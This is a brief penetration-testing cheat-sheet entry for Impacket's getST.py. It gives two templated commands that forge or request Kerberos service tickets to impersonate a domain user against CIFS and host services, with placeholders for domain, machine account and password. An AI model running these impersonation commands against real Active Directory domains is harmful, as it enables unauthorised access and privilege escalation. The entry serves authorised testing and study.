# getST (imp)

% impacket-kerberos, windows, kerberos, 88



## Silver ticket - impersonate user
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
getST.py -spn cifs/<target> <domain>/<netbios_name>\$ -impersonate <user>
```


## use silver ticket
```
getST.py -spn host/<dc2> -impersonate <user_to_impersonate> -dc-ip <dc1_ip> '<domain>/<computer_name>$:<computer_password>'
```
